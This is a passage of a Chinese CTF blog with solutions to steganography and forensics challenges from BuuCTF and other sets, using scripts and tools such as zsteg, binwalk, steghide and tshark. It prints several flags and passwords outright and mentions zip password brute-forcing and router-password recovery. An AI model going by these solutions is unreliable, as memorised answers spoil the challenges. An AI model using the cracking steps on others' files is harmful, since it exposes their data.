class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">12521</span>\Desktop\CTFTools\信息隐藏\MP3Stego_1_1_18\MP3Stego&gt;MP3StegoDecode.exe -X -P syclovergeek C:\Users\<span class="number">12521</span>\Desktop\syclovergeek.mp3</span><br><span class="line">MP3StegoEncoder <span class="number">1.1</span><span class="number">.17</span></span><br><span class="line">See README file <span class="keyword">for</span> copyright info</span><br><span class="line">Input file = <span class="string">&#x27;C:\Users\12521\Desktop\syclovergeek.mp3&#x27;</span>  output file = <span class="string">&#x27;C:\Users\12521\Desktop\syclovergeek.mp3.pcm&#x27;</span></span><br><span class="line">Will attempt to extract hidden information. Output: C:\Users\<span class="number">12521</span>\Desktop\syclovergeek.mp3.txt</span><br><span class="line">the bit stream file C:\Users\<span class="number">12521</span>\Desktop\syclovergeek.mp3 <span class="keyword">is</span> a BINARY file</span><br><span class="line">HDR: s=FFF, id=<span class="number">1</span>, l=<span class="number">3</span>, ep=off, br=<span class="number">9</span>, sf=<span class="number">0</span>, pd=<span class="number">1</span>, pr=<span class="number">0</span>, m=<span class="number">0</span>, js=<span class="number">0</span>, c=<span class="number">0</span>, o=<span class="number">0</span>, e=<span class="number">0</span></span><br><span class="line">alg.=MPEG<span class="number">-1</span>, layer=III, tot bitrate=<span class="number">128</span>, sfrq=<span class="number">44.1</span></span><br><span class="line">mode=stereo, sblim=<span class="number">32</span>, jsbd=<span class="number">32</span>, ch=<span class="number">2</span></span><br><span class="line">[Frame <span class="number">5932</span>]Frame cannot be located</span><br><span class="line">Input stream may be empty</span><br><span class="line">Avg slots/frame = <span class="number">417.962</span>; b/smp = <span class="number">2.90</span>; br = <span class="number">128.001</span> kbps</span><br><span class="line">Decoding of <span class="string">&quot;C:\Users\12521\Desktop\syclovergeek.mp3&quot;</span> <span class="keyword">is</span> finished</span><br><span class="line">The decoded PCM output file name <span class="keyword">is</span> <span class="string">&quot;C:\Users\12521\Desktop\syclovergeek.mp3.pcm&quot;</span></span><br></pre></td></tr></table></figure><h3 id="FRA04-godwave"><a href="#FRA04-godwave" class="headerlink" title="FRA04 godwave"></a>FRA04 godwave</h3><p>使用脚本进行转化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wav = wave.open(<span class="string">&#x27;/root/桌面/11/godwave.wav&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">params = wav.getparams()</span><br><span class="line">nchannels, sampwidth, framerate, nframes = params[:<span class="number">4</span>]</span><br><span class="line">strData = wav.readframes(nframes)</span><br><span class="line">waveData = numpy.fromstring(strData, dtype=numpy.int16)</span><br><span class="line">waveData = waveData*<span class="number">1.0</span>/(max(abs(waveData)))</span><br><span class="line">string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">norm = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1735680</span>):</span><br><span class="line">    norm = norm+abs(waveData[i])</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) % <span class="number">64</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> norm &gt; <span class="number">10</span>:</span><br><span class="line">            string += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            string += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        norm = <span class="number">0</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;01output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output:</span><br><span class="line">    output.writelines(string)</span><br></pre></td></tr></table></figure><p>拿到一串二进制，进行曼切斯特解密，八个一组转换为ascii，发现是一张png，扫码拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">file_in = open(<span class="string">&#x27;01output.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">code = file_in.readline()</span><br><span class="line">file_in.close()</span><br><span class="line">le = len(str(code))</span><br><span class="line"><span class="keyword">print</span> le</span><br><span class="line"><span class="keyword">print</span> code</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> code != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    cp = code[:<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cp != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> cp[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> cp[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            res = (res&lt;&lt;<span class="number">1</span>)|<span class="number">0</span></span><br><span class="line">            count +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cp[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> cp[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            res = (res&lt;&lt;<span class="number">1</span>)|<span class="number">1</span></span><br><span class="line">            count +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">8</span>:</span><br><span class="line">            result += chr(res)</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Unexpected cp, exit!&#x27;</span> <span class="comment"># found &#x27;00&#x27; or &#x27;11&#x27;, stop the script directly</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    code = code[<span class="number">2</span>:]</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h3 id="FRA06-Ogrewatch"><a href="#FRA06-Ogrewatch" class="headerlink" title="FRA06 Ogrewatch"></a>FRA06 Ogrewatch</h3><p>那个一个文件不知道后缀名，使用Linux查看一下，放入linux之后可以直接打开是一个视频，但不是mp4格式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman: Matroska data</span><br></pre></td></tr></table></figure><p>百度了一下是一个MKV文件，也是视频格式的一种，在win下修改后缀为<code>mkv</code>。使用<code>ffmpeg </code>提取文件。分理出一个文件使用命令提取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i ogreman -map <span class="number">0</span>:s:<span class="number">0</span> ogreman-subs.srt</span><br><span class="line">grep <span class="string">&quot;font size&quot;</span> ogreman-subs.srt | cut -d<span class="string">&quot;&gt;&quot;</span> -f2</span><br></pre></td></tr></table></figure><h1 id="蓝鲸安全"><a href="#蓝鲸安全" class="headerlink" title="蓝鲸安全"></a>蓝鲸安全</h1><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="我们不一样"><a href="#我们不一样" class="headerlink" title="我们不一样"></a>我们不一样</h3><p>一张图片，提示我们，尝试binwalk拿到一样的图片。不一样需要进行比较，可以使用stegsolve，但是没有发现什么东西。</p><p>尝试kali–compare。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# compare &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.png&#39;  &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39;  out.png</span><br></pre></td></tr></table></figure><p>拿到一张图片有异常，在图的左下角，有一块红色区域。使用python将这两个图片不一样的部分的像素打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">img1 = Image.open(<span class="string">&quot;00000000.png&quot;</span>)</span><br><span class="line">im1 = img1.load()</span><br><span class="line"></span><br><span class="line">img2 = Image.open(<span class="string">&quot;00006909.png&quot;</span>)</span><br><span class="line">im2 = img2.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img1.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span>(im1[x,y]!=im2[x,y]):</span><br><span class="line">            print(im1[x,y],im2[x,y])</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1, 0, 42) (1, 0, 1)</span><br><span class="line">(1, 0, 42) (1, 0, 1)</span><br><span class="line">(2, 1, 43) (2, 1, 1)</span><br><span class="line">(2, 1, 43) (2, 1, 1)</span><br><span class="line">(2, 1, 43) (2, 1, 0)</span><br><span class="line">(2, 1, 43) (2, 1, 1)</span><br></pre></td></tr></table></figure><p>发现rgb的b通道都是0或者1，提取出来八个一组转化为二进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">img1 = Image.open(<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line">im1 = img1.load()</span><br><span class="line"></span><br><span class="line">img2 = Image.open(<span class="string">&quot;2.png&quot;</span>)</span><br><span class="line">im2 = img2.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">flag1=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img1.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span>(im1[x,y]!=im2[x,y]):</span><br><span class="line">            flag+=str(im2[x,y][<span class="number">2</span>])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">8</span>):</span><br><span class="line">    flag1+=chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag1)</span><br></pre></td></tr></table></figure><p>拿到flag。</p><h1 id="BuuCtf"><a href="#BuuCtf" class="headerlink" title="BuuCtf"></a>BuuCtf</h1><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;1# convert aaa.gif flag.png</span><br></pre></td></tr></table></figure><p>从分理出的图片拿到flag。</p><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>扫码提示<code>secret is here</code>。</p><p>binwalk分离拿到一个压缩包，名字为<code>4number</code>暴力破解拿到密码<code>7639</code>。</p><h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><p>拿到一个exe程序，直接<code>root@root:~/桌面/flag# strings &#39;/root/桌面/flag/output/zip/KEY.exe&#39; </code>。</p><p>拿到一个图片base64，放入浏览器解码。是个二维码扫描得到flag。</p><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>直接PNG修改高度。</p><h3 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h3><p>binwalk分离不出东西来，直接<code>strings</code>，拿到flag。</p><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>一个压缩包题目提示破解，四位数字，拿到密码之后，打开是base64解码拿到flag。</p><p><code>ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</code></p><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p><code>strings</code>命令拿到flag。</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>提示LSB直接使用kali的zsteg。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag<span class="comment"># zsteg &#x27;/root/桌面/flag/output/zip/flag11.png&#x27; </span></span><br><span class="line">imagedata           .. text: <span class="string">&quot;00010,&amp;&amp;\&quot;&quot;</span></span><br><span class="line">b1,rgb,lsb,xy       .. file: PNG image data, <span class="number">280</span> x <span class="number">280</span>, <span class="number">8</span>-bit/color RGB, non-interlaced</span><br></pre></td></tr></table></figure><p>可以看到rgb的lsb通道有一个PNG，直接上stegsolve，使用save bin功能，不要用save Text功能，保存为1.png。拿到二维码扫描得到flag。</p><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><p>文件属性拿到flag。</p><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>直接过滤http流量，找到一个登录界面拿到flag。</p><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><p>拿到一张图片，为jpg，提示密码是四位数字，想到steghide，但是不会爆破，binwalk分析，有一个zip，尝试foremost分离，分离出好多的文件夹，就是没有文件，尝试dd命令，拿到压缩包，爆破密码，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# dd if&#x3D;&#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.jpg&#39;  of&#x3D;flag.zip skip&#x3D;38689 bs&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>png图片直接上zsteg。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;steg.png&#39; </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meta date:create    .. text: &quot;2013-01-17T17:35:32-05:00&quot;</span><br><span class="line">meta date:modify    .. [same as &quot;meta date:create&quot;]</span><br><span class="line">imagedata           .. text: &quot;\&quot;&amp;&amp;\&quot;4&amp;$&gt;8:&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;Hey I think we can write safely in this file without anyone seeing it. Anyway, the secret key is: st3g0_saurus_wr3cks&quot;</span><br><span class="line">b2,r,msb,xy         .. text: [&quot;U&quot; repeated 178 times]</span><br><span class="line">b2,g,msb,xy         .. text: [&quot;U&quot; repeated 178 times]</span><br><span class="line">b2,b,msb,xy         .. text: [&quot;U&quot; repeated 178 times]</span><br><span class="line">b2,rgb,msb,xy       .. text: [&quot;U&quot; repeated 22 times]</span><br><span class="line">b2,bgr,msb,xy       .. text: [&quot;U&quot; repeated 22 times]</span><br><span class="line">b4,r,msb,xy         .. text: [&quot;w&quot; repeated 100 times]</span><br><span class="line">b4,g,msb,xy         .. file: MPEG ADTS, layer I, v2, 112 kbps, JntStereo</span><br><span class="line">b4,b,msb,xy         .. text: [&quot;w&quot; repeated 100 times]</span><br></pre></td></tr></table></figure><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>提示找文件，打开文件，查看总体协议分级。有http流量，直接过滤http。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/40.png" alt="40"></p><p>右键-&gt;显示分组字节流-&gt;显示为图像。对图片<code>strings</code>命令拿到flag。</p><h3 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h3><p>使用<code>string</code>命令，可以看到有RAR文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.jpg&#39; </span><br><span class="line">Rar!</span><br><span class="line">2.txt~</span><br><span class="line">fi#E</span><br><span class="line">-s%n</span><br></pre></td></tr></table></figure><p><code>foremost</code>分离拿到rar，爆破拿到flag。</p><h3 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h3><p>拿到一个图片，binwalk分离得到一个压缩包，需要密码。<code>strings jpg</code>，看到有<code>&lt;?xpacket begin=</code>信息，说明图片属性有信息，查看图片属性发现一个字符串，作为密码解压拿到flag。</p><p>一个流量包，打开之后发现只有TCP协议，协议分析发现也带有数据(Data)。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/41.png" alt="41"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/42.png" alt="42"></p><p>接着查看每个数据包，发现有的数据包有Data字段，第一个为F，第二个为L。正好是flag字段，尝试<code>tshark</code>提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r easycap.pcap -T fields -e &quot;data.data&quot; | tr &quot;\n&quot; &quot; &quot; | sort -u</span><br></pre></td></tr></table></figure><p>截取到十六进制，转ascii拿到flag。</p><h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><p><code>strings</code>图片，末尾有二进制数据，查看长度为56，为八的倍数，直接转化字符串，得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady=<span class="string">&quot;01101011011011110110010101101011011010100011001101110011&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady),<span class="number">8</span>):</span><br><span class="line">    flag+=chr(int(steady[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">koekj3s</span><br></pre></td></tr></table></figure><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>png图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag<span class="comment"># zsteg &#x27;/root/桌面/flag/2.png&#x27; </span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39;  --all</span><br><span class="line">imagedata           .. text: &quot;KK&lt;220\r\r&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. file: Zip archive data, at least v2.0 to extract</span><br><span class="line">b1,bgr,msb,xy       .. text: &quot;saZ$S:&#39;6&quot;</span><br><span class="line">b2,r,msb,xy         .. file: PGP\011Secret Sub-key -</span><br></pre></td></tr></table></figure><p>有zip文件，stegsolve提取出来，有一个没有后缀的文件。</p><p>放入winhex，发现是个<code>ELF文件</code>。</p><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>盲文拿到密码，拿到一个音频。音频是一个短杠、长杆，短杠为.，长杠为-。拿到莫斯解码，拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</span><br></pre></td></tr></table></figure><h3 id="隐藏的密码"><a href="#隐藏的密码" class="headerlink" title="隐藏的密码"></a>隐藏的密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;隐藏的钥匙.jpg&#39; | grep &quot;flag&quot;</span><br><span class="line">flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE&#x3D;)</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h3><p>伪加密，解压一个没有后缀的文件，放入。winhex，有点像PNG，但是缺少头加入<code>89 50 4E 47 0D 0A 1A 0A</code>。</p><p>一定要注意，不能先修改文件后缀，要在原始的文件上修改，然后在修改名字。拿到一串数字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">424A447B79316E677A756973687561697D</span><br></pre></td></tr></table></figure><p>一开始以为是md5，尝试十六进制解码，拿到flag。</p><h3 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h3><p><code>zsteg</code>分析没有信息，尝试binwalk，分理出一个图片，在linux打开打不开，提示CRC有问题。但是在win上可以打开。肯定是CRC爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">m = open(<span class="string">&quot;1.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0xC2C143B3</span>:</span><br><span class="line">            p=<span class="number">1</span></span><br><span class="line">            <span class="comment">#print(c)</span></span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>一定要查看CRC值，然后修改脚本，别忘了修改。</p><h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><p>爆破压缩包，解密brainfuck解码。</p><h3 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h3><p>RouterPassView解密。</p><h3 id="来首歌曲"><a href="#来首歌曲" class="headerlink" title="来首歌曲"></a>来首歌曲</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</span><br></pre></td></tr></table></figure><p>莫斯密码，拿到flag。</p><h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><p>打开分析协议，有http协议，发现有数据，很多字符，最有有一个=，考虑base64图片，加入头放入浏览器显示错误。</p><p>直接解密base64，转化为图片拿到flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/43.png" alt="43"></p><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><p>binwalk 分理出压缩包，伪加密，拿到两个压缩包。拿到一张图片，尝试setghide。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steghide.exe extract -sf C:\Users\12521\Desktop\good-已合并.jpg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;ko.txt&quot;.</span><br></pre></td></tr></table></figure><p>拿到另一个压缩包密码，解密拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bV1g6t5wZDJif^J7</span><br></pre></td></tr></table></figure><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><p>binwalk 